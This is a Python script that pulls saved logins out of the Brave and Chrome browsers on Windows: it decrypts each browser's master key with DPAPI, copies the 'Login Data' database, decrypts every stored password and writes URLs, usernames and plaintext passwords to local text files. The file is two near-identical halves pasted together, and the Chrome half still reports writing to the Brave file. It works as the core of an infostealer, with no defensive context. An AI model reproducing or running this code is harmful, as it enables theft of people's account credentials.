import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "BraveSoftware", "Brave-Browser", "User Data", "default", "Login Data")
    filename = "Brave_passwords.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, username_value, password_value, date_last_used from logins order by date_last_used")
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        password = decrypt_password(row[2], key)
        date_last_used = row[3]        
        if username or password:
            text_file = open("Brave_Passwords.txt", "a")
            text_file.write(f"Last Used: {date_last_used}")
            text_file.write("\n")
            text_file.write(f"Origin URL: {origin_url}")
            text_file.write("\n")
            text_file.write(f"Username: {username}")
            text_file.write("\n")
            text_file.write(f"Password: {password}")
            text_file.write("\n")
            text_file.write("="*50)
            text_file.write("\n")
            text_file.close()
        else:
            continue
        if date_last_used != 86400000000 and date_last_used:
            print("Password exported to Brave_Passwords.txt")

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()

#chrome    
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "Chrome_Passwords.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, username_value, password_value, date_last_used from logins order by date_last_used")
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        password = decrypt_password(row[2], key)
        date_last_used = row[3]        
        if username or password:
            text_file = open("Chrome_Passwords.txt", "a")
            text_file.write(f"Last Used: {date_last_used}")
            text_file.write("\n")
            text_file.write(f"Origin URL: {origin_url}")
            text_file.write("\n")
            text_file.write(f"Username: {username}")
            text_file.write("\n")
            text_file.write(f"Password: {password}")
            text_file.write("\n")
            text_file.write("="*50)
            text_file.write("\n")
            text_file.close()
        else:
            continue
        if date_last_used != 86400000000 and date_last_used:
            print("Password exported to Brave_Passwords.txt")

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()